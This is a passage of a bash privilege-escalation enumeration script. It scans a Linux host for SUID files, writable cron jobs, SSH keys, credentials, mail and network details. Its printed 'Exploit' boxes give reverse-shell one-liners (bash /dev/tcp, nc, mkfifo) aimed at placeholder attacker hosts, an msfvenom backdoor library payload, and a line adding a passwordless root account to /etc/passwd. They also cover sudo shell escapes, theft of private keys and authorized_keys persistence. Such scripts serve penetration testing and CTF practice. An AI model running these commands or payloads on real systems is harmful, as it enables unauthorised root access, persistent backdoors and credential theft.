echo -e "\n${BLUE}╔═════{ Finding System SUID:${XX}"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always
echo -e "\n${BLUE}╔═════{ SUID not built-in (Supper Interesting :D)${XX}"
    find / -perm -u=s 2>/dev/null | xargs ls -la --color=always | grep -v pppd | grep -v exim4 | grep -v ntfs-3g | grep -v chsh | grep -v su | grep -v chfn | grep -v mount | grep -v sudo | grep -v umount | grep -v pkexec | grep -v passwd | grep -v newgrp | grep -v gpasswd | grep -v fusermount | grep -v mount.nfs | grep -v mount.cifs | grep -v Xorg.wrap | grep -v ssh-keysign | grep -v chrome-sandbox | grep -v polkit-agent-helper-1 | grep -v vmware-user-suid-wrapper | grep -v dbus-daemon-launch-helper
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║SUID (set owner userId upon execution) is a special type of file permission given to a file. SUID gives temporary   ║"
        echo -e "\t║permissions to a user to run the program/file with the permission of the file owner rather than the user who runs it║"
        echo -e "\t║When extra bit “4” is set to user(Owner) it becomes SUID (Set user ID):                                             ║"
        echo -e "\t║-rw${RED}x${XX}                -rwx     -rwx                                                                                   ║"
        echo -e "\t║SUID                                                                                                                ║"
        echo -e "\t║-rw${RED}s${XX}                                                                                                                ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    https://gtfobins.github.io/                                                                                     ║"
        echo -e "\t║    https://mil0.io/linux-privesc/                                                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Finding System SGID (execute as the group):${XX}"
    find / -perm -g=s -type f 2>/dev/null | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║When bit “2” is set to group it becomes SGID (Set Group ID):                                                        ║"
        echo -e "\t║-rwx     -rw${RED}x${XX}                -rwx                                                                                   ║"
        echo -e "\t║         SGID                                                                                                       ║"
        echo -e "\t║         -rw${RED}s${XX}                                                                                                       ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    https://gtfobins.github.io/                                                                                     ║"
        echo -e "\t║    https://mil0.io/linux-privesc/                                                                                  ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Find sticky-bit binaries:${XX}"
    find / -type d -perm -1000 -exec ls -ld --color=always {} \; 2>/dev/null
echo -e "\n${BLUE}╔═════{ World writable scripts invoked as root:${XX}"
echo -e "\n${RED}Run this command manually: find / -writable -type f 2>/dev/null | xargs ls -la${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you find a script that is owned by root but is writable by anyone, you can add your own malicious code into it & ║"
        echo -e "\t║it will escalate your privileges when the script runs as root.                                                      ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
        echo -e "\t║    bash: echo 'bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1' >> file                                     ║"
        echo -e "\t║    netcat: echo 'nc <attacker_IP> <attacker_PORT> -e /bin/sh' >> file                                              ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ World writable directories:${XX}"
    find / -type d \( -perm -g+w -o -perm -o+w \) -exec ls -lad --color=always {} \; | head -100 2>/dev/null
echo -e "\n${BLUE}╔═════{ World executable folders:${XX}"
    find / -perm o=x -type d 2>/dev/null
echo -e "\n${BLUE}╔═════{ World Writable files:${XX}"
    find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) 2>/dev/null
echo -e "\n${BLUE}╔═════{ Writable config files:${XX}"
    find /etc/ -writable -type f --color=always 2>/dev/null 
echo -e "\n${BLUE}╔═════{ How Files Can Be Upload/Download:${XX}"
    which wget nc netcat socat python python2 python3 ftp tftp ssh smb | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Some of them my have file misconfiguration and my lead to user escalation. File Transfer Cheatsheet: Windows & Linux║"
        echo -e "\t║    https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Unexpected commands allows you to read and/or write files or even execute command:${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║sudo awk 'BEGIN {system('/bin/sh')}'                                                                                ║"
        echo -e "\t║sudo find /etc -exec sh -i \;                                                                                       ║"
        echo -e "\t║sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh                                                                ║"
        echo -e "\t║sudo tar c a.tar -I ./runme.sh a                                                                                    ║"
        echo -e "\t║ftp>!/bin/sh                                                                                                        ║"
        echo -e "\t║less>! <shell_comand>                                                                                               ║"
        echo -e "\t║                                Give it a try                                                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Profile files:${XX}"
    ls -la /etc/profile --color=always
echo -e "\n${BLUE}╔═════{ Profile.d files:${XX}"
    ls -la /etc/profile.d/ --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║The file /etc/profile and the files under /etc/profile.d/ are scripts that are executed when a user run a new shell.║"
        echo -e "\t║Therefore, if you can write or modify any of the files, you can escalate your privilege.                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ User Configuration Files${XX}"
echo -e "\n${BLUE}    ══{ Is the .bashrc file writable?${XX}"
    locate .bashrc | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Is executed when a new terminal window is opened from an existing login session or when a new shell instance is     ║"
        echo -e "\t║started from an existing login session.                                                                             ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Is the .bash_profile file writable?${XX}"
    locate .bash_profile | xargs ls -la --color=always
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║The ~/.bash_profile file is a configuration file for configuring user environments. The users can modify the default║"
        echo -e "\t║settings and add any extra configurations in it.                                                                    ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Exploit them:${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the files are writable, malicious commands can be written to it and will be executed when the user logs in to the║"
        echo -e "\t║system via a serial console or SSH or starts a new terminal.                                                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═══════════════════════════════════(50%).....................................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ System Process and Services ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
sleep 2
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Have a look to what processes are being executed and check if any process has more privileges than it should.       ║"
        echo -e "\t║You can also use a tool called psyp.                                                                                ║"
        echo -e "\t║    https://github.com/DominicBreuker/pspy                                                                          ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Running Proccess on the system:${XX}"
    ps aux 
echo -e "\n${BLUE}╔═════{ Running Proccess as root:${XX}"
    ps aux | grep --color=always root
echo -e "\n${BLUE}╔═════{ Running Proccess as current user:${XX}"
    ps aux | grep --color=always $USER
echo -e "\n${BLUE}╔═════{ Process binaries and associated permissions:${XX}"
    ps aux 2>/dev/null | awk '{print $11}'| xargs -r ls -la 2>/dev/null | awk '!x[$0]++' 2>/dev/null
echo -e "\n${BLUE}╔═════{ Is tmux Running as root:${XX}"
    ps aux | grep tmux --color=always 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║ls -l /path on the proccess                                                                                         ║"
        echo -e "\t║tmux -S /path on the proccess                                                                                       ║"
        echo -e "\t║https://resources.infosecinstitute.com/topic/hack-the-box-htb-machines-walkthrough-series-valentine/                ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Node.js Running on the system:${XX}"
    ps aux | grep --color=always .js 2>/dev/null
echo -e "\n${BLUE}╔═════{ Is Artifactory running on the system:${XX}"
    ps aux | grep artifactory 2>/dev/null
echo -e "\n${BLUE}╔═════{ Is VNC running on the system:${XX}"
    ps -auwwx | grep vnc 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║:1 - display number 1                                                                                               ║"
        echo -e "\t║-rfbauth {PATH} - specifies the file containing the password used to auth viewers                                   ║"
        echo -e "\t║-rfbport {PORT} - tells us which port to connect to                                                                 ║"
        echo -e "\t║ocalhost - only listen locally                                                                                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Are service config files readable/wreitable by current user:${XX}"
    find /etc/init.d/ -uid 0 -type f 2>/dev/null | xargs ls -la --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Shared object libraries (GOOD FOR BACKDOOR):${XX}"
        if [ -f /usr/local/bin/program ]; 
            then
                ldd /usr/local/bin/program 2>/dev/null
            else
                echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Is the executable compiled with RPATH or RUNPATH (GOOD FOR BACKDOOR):${XX}"
    objdump -x /usr/local/bin/program 2>/dev/null | grep -i "RPATH\|RUNPATH"
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any executable is found, create the backdoor using any payload you wich, using the same file name found.           ║"
        echo -e "\t║For Example:                                                                                                          ║"
        echo -e "\t║Create payload using msfvenome:                                                                                       ║"
        echo -e "\t║    msfvenom -a x64 -p linux/x64/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker LPORT> -f elf-so -o FILENAME.so║"
        echo -e "\t║Then send the file to the same directory, configure a Metasploit listener with the same payloadlunch and wait for     ║"
        echo -e "\t║the program to be launched by a user with elevated privileges.                                                        ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ System Path Scheduled Tasks ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Current User Crontab:${XX}"
    crontab -l 2>/dev/null
echo -e "\n${BLUE}    ══{ Spool Area:${XX}"
    ls -LR /var/spool/cron 2>/dev/null
echo -e "\n${BLUE}    ══{ etc Area:${XX}"
    ls -al /etc/ | grep cron 2>/dev/null
echo -e "\n${BLUE}    ══{ at.allow:${XX}"
    if [ -f /etc/at.allow ]; 
        then
		    cat /etc/at.allow 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ at.deny:${XX}"
    if [ -f /etc/at.deny ]; 
        then
		    cat /etc/at.deny 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ cron.allow:${XX}"
    if [ -f /etc/cron.allow ]; 
        then
		    cat /etc/cron.allow 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ cron.deny:${XX}"
    if [ -f /etc/cron.deny ]; 
        then
		    cat /etc/cron.deny 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ cron.deny:${XX}"
    if [ -f /etc/cron.deny ]; 
        then
		    cat /etc/cron.deny 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ Anacrontab:${XX}"
    if [ -f /etc/anacrontab ]; 
        then
		    cat /etc/anacrontab 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi
echo -e "\n${BLUE}    ══{ Find World-Writable Cron jobs:${XX}"
    find /etc/cron* -type f -perm -o+w -exec ls -l {} \; 2>/dev/null
echo -e "\n${BLUE}    ══{ Other User Crontab [It may need root]:${XX}"
    cut -d ":" -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If you have the root/user password, try to run the command manually:                                                ║"
        echo -e "\t║    cut -d ':' -f 1 /etc/passwd | xargs -n1 crontab -l -u 2>/dev/null                                               ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}    ══{ Scheduled Jobs:${XX}"
    cat /etc/crontab 2>/dev/null
        echo -e "\t╔═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If the file is running by root, & ${RED}writable to anyone${XX}, the attacker my replace the content of the file.               ║"
        echo -e "\t║${RED}Exploit:${XX}                                                                                                             ║"
        echo -e "\t║    echo '/bin/sh' >> file                                                                                           ║"
        echo -e "\t║    echo '/bin/bash' >> file                                                                                         ║"
        echo -e "\t║    echo 'bash -i >& /dev/tcp/a.a.a.a/4242 0>&1' >> file                                                             ║"
        echo -e "\t║    echo 'm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc a.a.a.a 80 >/tmp/f' >> file                           ║"
        echo -e "\t║    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> file                                                        ║"
        echo -e "\t║    echo 'echo root::0:0:root:/root:/bin/bash >> /etc/passwd' >> file                                                ║"
        echo -e "\t║    From attacker PC: msfvenom -p cmd/unix/reverse_python lhost=a.a.a.a lport=80 (echo it to the file)               ║"
        echo -e "\t║    You can use any Reverse Shell payload from payloadallthethings in GitHub                                         ║"
        echo -e "\t╚═════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════[ Communications & Networking ]════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Host public IP Address:${XX}"
    dig +short myip.opendns.com @resolver1.opendns.com 2>/dev/null
echo -e "\n${BLUE}╔═════{ Basic Network Details:${XX}"
    ifconfig | grep -v "ether\|loop\|TX\|RX"
echo -e "\n${BLUE}╔═════{ Default Gatway:${XX}"
    route 2>/dev/null
echo -e "\n${BLUE}╔═════{ Full Network Details:${XX}"
    ifconfig
echo -e "\n${BLUE}╔═════{ Firewall Rulls:${XX}"
    iptables -nvL
echo -e "\n${BLUE}╔═════{ Other users & hosts are communicating with the system:${XX}"
    lsof -i
echo -e "\n${BLUE}╔═════{ Open Ports:${XX}"
    netstat -tulpna
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Are there any open ports on localhost we did not see when we were doing nmap? This might need tunneling or connecting ║"
        echo -e "\t║to it locally. If nothing is displayed run the command manually: netstat -tulpna                                      ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Network Route & Neighbours:${XX}"
    /sbin/route -nee
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Want to know how many hops are between our compromised machine, and other network segments, do the following manually:║"
        echo -e "\t║    traceroute –n <ip address>                                                                                        ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ ARP Cashe:${XX}"
    arp; arp -en | grep -v Address
echo -e "\n${BLUE}╔═════{ Hosts File:${XX}"
    cat /etc/hosts 
echo -e "\n${BLUE}╔═════{ DNS Server:${XX}"
    cat /etc/resolv.conf | grep nameserver
echo -e "\n${BLUE}╔═════{ Outbound port connectivity:${XX}"
echo -e "\n${BLUE}    ══{ Testing Connection:${XX}"
    ping -c 4 portquiz.net 2>/dev/null
echo -e "\n${BLUE}    ══{ Scanning Outbound Target:${XX}"
    nmap -sT -p4444-4450 portquiz.net 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Knowing this information will come in handy if and when we need to establish outbound connections to other systems  ║"
        echo -e "\t║we control for the purpose of maintaining access or exfiltrating data.                                              ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n\n${RED}\t\tEnumeration on progress ╔═══════════════════════════════════(80%)═════════════════....................${XX}\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═══════════════════════════════════════════[ Finding SSH Keys ]═════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
sleep 2
echo -e "\n${BLUE}╔═════{ SSH is configured for Public Key Authentication:${XX}"
    if [ -f /etc/ssh/sshd_config ]; 
	    then
    	    cat /etc/ssh/sshd_config | grep 'PubkeyAuthentication' --color=always 
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║is a method in which you generate and store on your computer a pair of cryptographic keys and then configure your   ║"
        echo -e "\t║server to recognize and accept your keys. A private key, usually named id_rsa, A public key, named id_rsa.pub       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
     		echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Identify any existing public or private keys:${XX}"
    ls -la /$USER /etc/ssh /home/$USER/.ssh/ --color=always 2>/dev/null; cat /home/$USER/.ssh/id_rsa 2>/dev/null; cat /home/$USER/.ssh/id_dsa 2>/dev/null
echo -e "\n${RED}Exploiting Misconfigured SSH Keys${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Secure Shell (SSH) is a cryptographic network protocol which allows users to securely perform a number of network   ║"
        echo -e "\t║services, such as remote authentication or file transfer over an unsecured network. Exploit:                        ║"
        echo -e "\t║    https://steflan-security.com/linux-privilege-escalation-exploiting-misconfigured-ssh-keys/                      ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ id_rsa:${XX}"
find / -iname id_rsa 2>/dev/null
            echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
            echo -e "\t║If anyone have access to any user's id_rsa, he can login to the system using that key.                              ║"
            echo -e "\t║${RED}Exploit:${XX}                                                                                                            ║"
            echo -e "\t║    scp -P 22 username@v.v.v.v:/path/of/victim_rsa /path/to/attacker                                                ║"
            echo -e "\t║    chmod 0600 id_rsa                                                                                               ║"
            echo -e "\t║    ssh -p 22 user-of-id_rsa@v.v.v.v -i id_rsa                                                                      ║"
            echo -e "\t║Read More:                                                                                                          ║"
            echo -e "\t║    https://matt.might.net/articles/ssh-hacks/                                                                      ║"
            echo -e "\t║    https://book.hacktricks.xyz/pentesting/pentesting-ssh                                                           ║"
            echo -e "\t║    https://unix.stackexchange.com/questions/23291/how-to-ssh-to-remote-server-using-a-private-key                  ║"
            echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"    
echo -e "\n${BLUE}╔═════{ id_dsa:${XX}"
    find / -iname id_dsa 2>/dev/null
echo -e "\n${BLUE}╔═════{ authorized_keys:${XX}"
    find / -iname authorized_keys 2>/dev/null
echo -e "\n${BLUE}╔═════{ ssh_config File:${XX}"
    if [ -f /etc/ssh/ssh_config ]; 
        then
            ls -la /etc/ssh/ssh_config --color=always
            echo -e "\n${BLUE}    ══{ Reading ssh_config File:${XX}"
                cat /etc/ssh/ssh_config
            echo -e "\n${BLUE}    ══{ Max Sessions Allowed 'defaults is 10':${XX}"
                cat /etc/ssh/ssh_config | grep MaxSession
            echo -e "\n${BLUE}    ══{ Is HashKnownHosts Enable:${XX}"
                cat /etc/ssh/ssh_config | grep HashKnownHosts
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║If no, then we can read the content of ~/.ssh/known_hosts and try to break the hash.                                ║"
                echo -e "\t║    https://github.com/chris408/known_hosts-hashcat                                                                 ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ sshd_config File:${XX}"
    if [ -f /usr/share/openssh/sshd_config ]; 
        then
            ls -la /usr/share/openssh/sshd_config --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading sshd_config File:${XX}"
            cat /usr/share/openssh/sshd_config 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║Read more about sshd_config file:                                                                                   ║"
                echo -e "\t║    https://www.ssh.com/academy/ssh/sshd_config                                                                     ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ hosts.denied:${XX}"
    if [ -f /etc/hosts.denied ]; 
        then
            ls -la /etc/hosts.denied --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading hosts.denied:${XX}"
            cat /etc/hosts.denied 2>/dev/null
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ hosts.allow:${XX}"
        if [ -f /etc/hosts.allow ]; 
        then
            ls -la /etc/hosts.allow --color=always 2>/dev/null
            echo -e "\n${BLUE}    ══{ Reading hosts.allow:${XX}"
                cat /etc/hosts.allow 2>/dev/null
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║When a client attempts to connect to a network service on a remote system, these files are used to determine whether║"
                echo -e "\t║client access is allowed or denied. Use /etc/hosts.allow and /etc/hosts.deny to define rules that selectively allow ║"
                echo -e "\t║or deny clients access to server daemons on local system. Read More:                                                ║"
                echo -e "\t║    https://www.thegeekdiary.com/understanding-tcp-wrappers-in-linux/                                               ║"
                echo -e "\t║    http://www.freekb.net/Article?id=1091                                                                           ║"
                echo -e "\t║    https://www.smartdomotik.com/2015/02/09/using-etchosts-allow-and-etchosts-deny-to-secure-unix/                  ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Any active SSH session:${XX}"
    ps aux | grep ssh
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If any session is found, the session can be hijacked. Read more about SSH session hijacking:                        ║"
        echo -e "\t║    https://xorl.wordpress.com/2018/02/04/ssh-hijacking-for-lateral-movement/                                       ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Active SSH Session ID:${XX}"
    pstree -p $USER | grep ssh
echo -e "\n${BLUE}╔═════{ .key files:${XX}"
    find / -name *.key -type f 2>/dev/null
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Read the file and see if it has Proc-Type & DEK-Info which will indicate as an ssh key                              ║"
        echo -e "\t║Usage: ssh -i xyz.key username@ip/domain                                                                            ║"
        echo -e "\t║We can crack the key file offline:                                                                                  ║"
        echo -e "\t║    python /usr/share/john/ssh2john.py xyz.key > xyz.hash                                                           ║"
        echo -e "\t║    john --wordlist=/usr/share/wordlists/rockyou.txt ./xyz.hash                                                     ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ known_hosts:${XX}"
     if [ -f ~/.ssh/known_hosts ]; 
        then
		    cat ~/.ssh/known_hosts
                echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
                echo -e "\t║~/.ssh/known_hosts file list all machines that have been connected to recently. It’s possible we can connect to one ║"
                echo -e "\t║of these other machines using the key. However, the HashKnownHosts setting maybe enabled in /etc/ssh/ssh_config,    ║"
                echo -e "\t║so entries in the known_hosts file are hashed. Reading the file does not give us any useful information.            ║"
                echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ SSH Persistence:${XX}"
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║If we have write access to victim (user or root) ~/.ssh/authorized_keys file, we could simply append a new line to  ║"
        echo -e "\t║authorized_keys and use it as a backdoor for us.                                                                    ║"
        echo -e "\t║On Kali machine:                                                                                                    ║"
        echo -e "\t║    ssh-keygen                                                                                                      ║"
        echo -e "\t║    xclip -selection clipboard .ssh/id_rsa.pub                                                                      ║"
        echo -e "\t║On Victim machine:                                                                                                  ║"
        echo -e "\t║    echo 'ssh-rsa PASTE_bup-key_HERE' >> /home/USERNAME/.ssh/authorized_keys                                        ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n"
echo -e "${RED} \t\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════╗${XX}"
echo -e "${RED} \t\t ═════════════════════════════════════════════[ Extra Creds ]════════════════════════════════════════════ ${XX}"
echo -e "${RED} \t\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════╝${XX}"
echo -e "\n"
echo -e "\n${BLUE}╔═════{ Any odd files in :${XX}"
echo -e "\n${BLUE}    ══{ Optional sofware application /opt:${XX}"
    ls -l /opt/
echo -e "\n${BLUE}    ══{ Read-only user application /usr:${XX}"
    ls -l /usr/
echo -e "\n${BLUE}    ══{ Variable data files /var:${XX}"
    ls -l /var/
        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Are there any files that can be abused or writable to get root?                                                     ║"
        echo -e "\t║    https://www.linux.com/training-tutorials/linux-filesystem-explained/                                            ║"
        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ Mail Applications:${XX}"
    which sendmail 2>/dev/null
    which exim 2>/dev/null
echo -e "\n${BLUE}╔═════{ Mail File:${XX}"
    ls -la /var/mail/ --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Reading Mail File:${XX}"
    if [ -f /var/mail/ ]; 
        then
		    cat /var/mail/* 2>/dev/null
        else
            echo -e "  ${RED}File does not exist${XX}"
    fi   
echo -e "\n${BLUE}╔═════{ List Root Directory:${XX}"
    ls -la /root/
echo -e "\n${BLUE}╔═════{ Home Directory:${XX}"
    ls -la /home/ --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Tmp Directory:${XX}"
    ls -la /tmp  --color=always 2>/dev/null
echo -e "\n${BLUE}╔═════{ Backup Directory:${XX}"
    ls -la /var/backups 2>/dev/null && find / -type f  -iname *backup* -o -iname *.bak -o -iname *.bak* -o -iname *.bck -o -iname *.bk -o -iname *.old*  2>/dev/null  | xargs ls -la 2>/dev/null --color=always | grep backup
echo -e "\n${BLUE}╔═════{ .bak Files:${XX}"
    find / -iname *.bak -type f 2>/dev/null 2>/dev/null
        echo -e "\t╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════╗"
        echo -e "\t║Explore any interesting backup filename.                                                                      ║"
        echo -e "\t╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════╝"
echo -e "\n${BLUE}╔═════{ usr/local/bin/backup:${XX}"
    if [ -f /usr/local/bin/backup ]; 
        then
            echo -e "\n${BLUE}    ══{ backup File permision:${XX}"
                ls -la /usr/local/bin/backup 2>/dev/null
            echo -e "\n${RED}    ══{ Exploit:${XX}"
                echo -e “https://infosecwriteups.com/node-htb-vulnhum-vm-358be0bf616b”
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Apache2 Version:${XX}"
    apache2 -v 2>/dev/null; httpd -v 2>/dev/null
echo -e "\n${BLUE}╔═════{ Apache user:${XX}"
    if [ -f /etc/apache2/envvars ]; 
        then
            grep --color=always -i 'user\|group' /etc/apache2/envvars 2>/dev/null --color=always 
        else
            echo -e "${RED}	File does not exist${XX}"
    fi
echo -e "\n${BLUE}╔═════{ Apache Config File:${XX}"
    if [ -f /var/apache2/config.inc ]; 
        then
            cat /var/apache2/config.inc 2>/dev/null 
        else
            echo -e "${RED}	File does not exist${XX}"
    fi 
echo -e "\n${BLUE}╔═════{ Check readability of apache/nginx access log:${XX}"
